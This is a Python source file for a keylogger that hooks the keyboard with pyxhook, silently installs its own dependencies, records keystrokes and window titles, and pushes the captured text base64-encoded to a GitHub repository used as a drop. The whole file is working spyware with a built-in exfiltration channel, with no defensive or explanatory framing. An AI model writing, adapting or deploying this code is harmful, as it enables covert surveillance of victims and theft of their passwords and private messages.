import json
import base64
import sys
import imp
import time
import subprocess

from random import randint
from threading import Thread
from queue import Queue

# dynamic import start
try:
    from github3 import login
except Exception as e:
    try:
        subprocess.check_output("python -m pip install github3.py --user", shell=True)
        from github3 import login
    except Exception as e:
        raise e
try:
    import pyxhook
except Exception as e:
    try:
        subprocess.check_output("python -m pip install pyxhook --user", shell=True)
        import pyxhook
    except Exception as e:
        raise e
# dynamic import end

isspace = lambda c:     (c == 32 or c == 9)

class Logger():

    def __init__(self):
        """Initialize object"""
        self.id     = "001"       # id
        self.config_json = None

        self.str_buffer = ""
        self.current_window = None
    
    def connect_to_github(self):
        """Connect to github"""
        
        self.gh = login(username="yourusername", password="yourpassword")
        self.repo = self.gh.repository("yourusername", "yourrepository")
        self.branch = self.repo.branch("master")

    def store_log(self):
        """Push results to github"""
        self.connect_to_github()
        data_path = "data/%s/logger_%d.data" % (self.id, round(time.time()))
        self.repo.create_file(data_path, "KeyStrokes", base64.b64encode(self.str_buffer.encode()))
        self.str_buffer = ""

    def KeyStroke(self, event):
        """Log keys"""

        if self.current_window != event.WindowName:
            self.current_window = event.WindowName
            try:
                self.str_buffer += "\n"+self.current_window+"\n"
            except TypeError as e:
                self.str_buffer += "\n"+self.current_window.decode()+"\n"

        if "BackSpace" in event.Key and len(self.str_buffer):
            self.str_buffer = self.str_buffer[:-1]
        elif event.Ascii > 32 and event.Ascii < 128 or isspace(event.Ascii):
            self.str_buffer += chr(event.Ascii)
        elif "Return" in event.Key:
            self.str_buffer += "\n"

        if len(self.str_buffer) >= 512:
            self.store_log()
        return True

def main(argc, argv):
    logger = Logger()

    kl = pyxhook.HookManager()
    kl.KeyDown = logger.KeyStroke
    kl.HookKeyboard()
    kl.start()

if __name__ == '__main__':
    main(len(sys.argv), sys.argv)
